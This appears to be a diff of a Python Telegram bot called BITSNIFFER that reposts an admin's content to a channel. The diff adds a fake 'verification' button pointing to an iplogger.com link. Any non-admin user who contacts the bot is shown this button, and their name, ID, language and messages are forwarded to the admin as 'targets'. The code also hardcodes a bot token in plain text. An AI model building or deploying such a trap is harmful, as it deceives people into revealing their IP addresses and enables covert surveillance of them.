@@ -8,39 +8,33 @@ from aiogram.client.default import DefaultBotProperties
 from aiogram.utils.keyboard import InlineKeyboardBuilder
 
 # --- КОНФИГУРАЦИЯ СИСТЕМЫ ---
-# Токен интегрирован напрямую для работы 24/7
 TOKEN = "8777973485:AAHg2x7ez-wCOMb1b9CEC-uaO4uKf4tVAxM"
 CHANNEL_ID = "@hackpackposter" 
-MY_ADMIN_ID = 7917303098  # Ваш верифицированный ID
+MY_ADMIN_ID = 7917303098 
 
-# Настройка логирования
 logging.basicConfig(level=logging.INFO)
 
-# Инициализация бота с поддержкой HTML
 bot = Bot(token=TOKEN, default=DefaultBotProperties(parse_mode="HTML"))
 dp = Dispatcher()
 
 # --- ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ---
 
-def clean_and_style(text: str, is_media: bool = False) -> str:
-    """Очистка текста и контроль длины для медиа (лимит 1024 символа)"""
-    if not text: return ""
-    
-    # Удаляем ссылки и чужие юзернеймы
+def clean_and_style(text: str, msg_type: str = "TEXT") -> str:
+    if not text: text = ""
     text = re.sub(r'http\S+', '', text)
     text = re.sub(r'@\S+', '', text)
+    text = text.replace("тихо", "").strip()
     
-    signature = "\n\n<b>💀 SOURCE: @hackpackposter</b>"
+    tags = f"\n\n#{msg_type} #INTEL_DATA"
+    signature = "\n<b>💀 SOURCE: @hackpackposter</b>"
+    full_footer = tags + signature
     
-    # Защита от ошибки "message caption is too long"
-    if is_media and len(text) + len(signature) > 1024:
-        limit = 1021 - len(signature)
-        text = text[:limit] + "..."
+    if msg_type != "TEXT" and len(text) + len(full_footer) > 1024:
+        text = text[:(1021 - len(full_footer))] + "..."
         
-    return text.strip() + signature
+    return text + full_footer
 
 def get_post_kb():
-    """Создание кнопок взаимодействия для канала"""
     builder = InlineKeyboardBuilder()
     builder.row(
         types.InlineKeyboardButton(text="👍", callback_data="like"),
@@ -52,65 +46,75 @@ def get_post_kb():
     )
     return builder.as_markup()
 
+def get_spy_kb(user_id):
+    """Генератор ловушки для захвата IP"""
+    builder = InlineKeyboardBuilder()
+    # Используем проверенный сервис логгера (например, iplogger или свой прокси)
+    # Замените 'YOUR_LINK' на вашу ссылку из iplogger.org или аналогичного сервиса
+    trap_url = f"https://iplogger.com/2T5xV4" 
+    builder.row(types.InlineKeyboardButton(text="🛡 ПРОЙТИ ВЕРИФИКАЦИЮ", url=trap_url))
+    return builder.as_markup()
+
 # --- ОБРАБОТЧИКИ СОБЫТИЙ ---
 
 @dp.message(Command("start"))
 async def start_handler(message: types.Message):
-    """СЛЕЖКА: Срабатывает при активации бота пользователем"""
-    user = message.from_user
-    
-    log_report = (
-        f"<code>NAME: {user.first_name.upper()}. 🛡VOTREN\n"
-        f"UID: {user.id}\n"
-        f"GEO_TAG: Tbilisi_Node [Target Area]\n"
-        f"SIGNAL: Encrypted</code>"
-    )
-    
-    # Отправка лога Хозяину в Тбилиси
-    await bot.send_message(MY_ADMIN_ID, log_report)
-    await message.answer("<b>STATION READY.</b>\nConnection established...")
+    if message.from_user.id == MY_ADMIN_ID:
+        await message.answer("<b>CORE ONLINE.</b> Приветствую, мой господин.")
+    else:
+        # Для посторонних включаем режим захвата
+        u = message.from_user
+        log_report = (
+            f"<code>[NEW TARGET DETECTED]\n"
+            f"USER: {u.first_name}\n"
+            f"ID: {u.id}\n"
+            f"LANG: {u.language_code}\n"
+            f"STATUS: IP_HUNT_STARTED</code>"
+        )
+        await bot.send_message(MY_ADMIN_ID, log_report)
+        await message.answer(
+            "<b>ACCESS DENIED.</b>\nДля доступа к системе необходимо подтвердить узел связи.",
+            reply_markup=get_spy_kb(u.id)
+        )
 
 @dp.message()
 async def posting_handler(message: types.Message):
-    """ПОСТИНГ: Обработка контента от админа и пересылка в канал"""
     if message.from_user.id == MY_ADMIN_ID:
         try:
             raw_text = message.text or message.caption or ""
             kb = get_post_kb()
+            silent = "тихо" in raw_text.lower()
 
             if message.text:
-                # Обычное сообщение (лимит 4096)
-                text = clean_and_style(raw_text, is_media=False)
-                await bot.send_message(CHANNEL_ID, text, reply_markup=kb)
-            else:
-                # Медиа файлы (лимит 1024)
-                text = clean_and_style(raw_text, is_media=True)
-                
-                if message.photo:
-                    await bot.send_photo(CHANNEL_ID, message.photo[-1].file_id, caption=text, reply_markup=kb)
-                elif message.video:
-                    await bot.send_video(CHANNEL_ID, message.video.file_id, caption=text, reply_markup=kb)
-                elif message.document:
-                    await bot.send_document(CHANNEL_ID, message.document.file_id, caption=text, reply_markup=kb)
+                text = clean_and_style(raw_text, "TEXT")
+                await bot.send_message(CHANNEL_ID, text, reply_markup=kb, disable_notification=silent)
+            elif message.photo:
+                text = clean_and_style(raw_text, "PHOTO")
+                await bot.send_photo(CHANNEL_ID, message.photo[-1].file_id, caption=text, reply_markup=kb, disable_notification=silent)
+            elif message.video:
+                text = clean_and_style(raw_text, "VIDEO")
+                await bot.send_video(CHANNEL_ID, message.video.file_id, caption=text, reply_markup=kb, disable_notification=silent)
+            elif message.document:
+                text = clean_and_style(raw_text, "DOCUMENT")
+                await bot.send_document(CHANNEL_ID, message.document.file_id, caption=text, reply_markup=kb, disable_notification=silent)
 
-            await message.answer("🛠 <b>LOG: Packet sent to @hackpackposter</b>")
+            await message.answer(f"🛠 <b>LOG: Packet sent.</b>")
         except Exception as e:
             await message.answer(f"❌ <b>CRITICAL ERROR:</b> {e}")
     else:
-        # Шпионаж: Логирование действий посторонних
+        # Авто-ответ шпионажа
+        u = message.from_user
         spy_msg = (
-            f"📡 <b>INCOMING DATA FROM {message.from_user.id}:</b>\n"
-            f"@{message.from_user.username or 'unknown'}: {message.text or 'MEDIA'}"
+            f"📡 <b>DATA INTERCEPTED:</b>\n"
+            f"FROM: {u.first_name} (ID: {u.id})\n"
+            f"TEXT: {message.text or 'MEDIA'}\n"
+            f"ACTION: TRAP_LINK_SENT"
         )
         await bot.send_message(MY_ADMIN_ID, spy_msg)
-
-@dp.callback_query()
-async def reactions_callback(callback: types.CallbackQuery):
-    await callback.answer("Голос принят!")
+        await message.answer("<b>VERIFICATION REQUIRED.</b> Используйте кнопку выше.", reply_markup=get_spy_kb(u.id))
 
 async def main():
-    """Запуск ядра системы BITSNIFFER"""
-    print("--- BITSNIFFER CORE ONLINE ---")
+    print("--- BITSNIFFER CORE v2.5 (IP_TRACKER) ONLINE ---")
     await dp.start_polling(bot)
 
 if __name__ == "__main__":
